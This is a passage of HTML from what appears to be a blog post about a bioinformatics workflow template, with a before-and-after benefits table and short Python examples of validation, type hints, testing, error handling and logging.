style="color:hsl(230, 4%, 64%)"># Run GitHub Actions locally</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run ci</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="benefits-and-impact">Benefits and Impact<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#benefits-and-impact" class="hash-link" aria-label="Direct link to Benefits and Impact" title="Direct link to Benefits and Impact" translate="no">​</a></h2>
<table><thead><tr><th>Aspect</th><th>Before</th><th>After</th></tr></thead><tbody><tr><td><strong>Onboarding time</strong></td><td>2-3 days</td><td>30 minutes</td></tr><tr><td><strong>Test setup</strong></td><td>Different per project</td><td>Standardized pytest</td></tr><tr><td><strong>CI/CD setup</strong></td><td>Write from scratch</td><td>Clone workflow</td></tr><tr><td><strong>Running tests locally</strong></td><td>"How do I test this?"</td><td><code>make -C apps/fastqc unittest</code></td></tr><tr><td><strong>Code consistency</strong></td><td>All over the place</td><td>Type hints, validation enforced</td></tr><tr><td><strong>New app creation</strong></td><td>Copy-paste existing</td><td>Use template structure</td></tr><tr><td><strong>App reusability</strong></td><td>One-off scripts</td><td>Modular, reusable components</td></tr><tr><td><strong>Team onboarding</strong></td><td>Weeks of confusion</td><td>30 min + documentation</td></tr></tbody></table>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices-for-template-adoption">Best Practices for Template Adoption<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#best-practices-for-template-adoption" class="hash-link" aria-label="Direct link to Best Practices for Template Adoption" title="Direct link to Best Practices for Template Adoption" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-one-function-per-purpose">1. <strong>One Function Per Purpose</strong><a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#1-one-function-per-purpose" class="hash-link" aria-label="Direct link to 1-one-function-per-purpose" title="Direct link to 1-one-function-per-purpose" translate="no">​</a></h3>
<p>Each function should do one thing well:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># ❌ Bad: Multiple responsibilities</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">process_fastq_and_align</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> ref</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    validate_fastq</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    align</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> ref</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    quality_check</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ✅ Good: Single responsibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">validate_fastq</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_alignment</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> ref</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">quality_check</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bam_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-always-validate-input">2. <strong>Always Validate Input</strong><a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#2-always-validate-input" class="hash-link" aria-label="Direct link to 2-always-validate-input" title="Direct link to 2-always-validate-input" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_analysis</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Validate before processing."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    input_path </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> input_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">raise</span><span class="token plain"> FileNotFoundError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Input file not found: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">input_file</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> input_path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">stat</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">st_size </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Input file is empty"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-use-type-hints">3. <strong>Use Type Hints</strong><a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#3-use-type-hints" class="hash-link" aria-label="Direct link to 3-use-type-hints" title="Direct link to 3-use-type-hints" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> pathlib </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> Path</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> List</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> Tuple</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">process_samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> List</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> Tuple</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> Path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Type hints help catch errors early."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-separate-unit-and-e2e-tests">4. <strong>Separate Unit and E2E Tests</strong><a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#4-separate-unit-and-e2e-tests" class="hash-link" aria-label="Direct link to 4-separate-unit-and-e2e-tests" title="Direct link to 4-separate-unit-and-e2e-tests" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Unit: Fast, no Docker needed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_validation</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> validate</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">valid_input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># E2E: Slow, includes Docker</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@pytest</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">mark</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">skipif</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">no_docker</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Docker required"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_full_workflow_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-document-dependencies">5. <strong>Document Dependencies</strong><a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#5-document-dependencies" class="hash-link" aria-label="Direct link to 5-document-dependencies" title="Direct link to 5-document-dependencies" translate="no">​</a></h3>
<p>Keep <code>requirements.txt</code> updated:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest&gt;=7.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">docker&gt;=6.0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">numpy&gt;=1.24</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pandas&gt;=1.5</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-patterns">Common Patterns<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#common-patterns" class="hash-link" aria-label="Direct link to Common Patterns" title="Direct link to Common Patterns" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="error-handling">Error Handling<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#error-handling" class="hash-link" aria-label="Direct link to Error Handling" title="Direct link to Error Handling" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> subprocess</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> sys</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_command</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> List</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">bool</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Run shell command with proper error handling."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">try</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        result </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> check</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> capture_output</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> text</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">except</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">CalledProcessError </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">as</span><span class="token plain"> e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Error: Command failed with exit code </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">returncode</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"stderr: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">e</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation">stderr</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        sys</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="logging-and-progress">Logging and Progress<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#logging-and-progress" class="hash-link" aria-label="Direct link to Logging and Progress" title="Direct link to Logging and Progress" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">import</span><span class="token plain"> logging</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">logger </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">process_pipeline</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> List</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Process with logging."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">enumerate</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samples</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        logger</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Processing sample </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation 